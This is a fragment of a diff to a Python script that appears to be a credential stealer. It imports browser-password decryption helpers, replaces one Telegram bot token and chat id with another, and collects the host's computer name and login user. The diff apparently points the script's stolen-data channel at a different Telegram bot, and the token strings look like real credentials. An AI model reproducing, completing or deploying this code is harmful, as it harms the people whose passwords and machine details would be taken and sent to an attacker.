@@ -6,8 +6,8 @@ from pyasn1.codec.der import decoder
 from hashlib import sha1, pbkdf2_hmac
 from Crypto.Util.Padding import unpad 
 from base64 import b64decode
-apibot1='6928288963:AAEjiFAwI9DypcXDkof7vqxPCCtr3LhuM5s'
-id1 = "-4090267574"
+apibot1='6790875951:AAFh4om41W4ma1gF5rd0CIfm2ljN1I5oZUQ'
+id1 = "-6790875951"
 
 hostname = os.getenv("COMPUTERNAME")
 usernamex = os.getlogin()
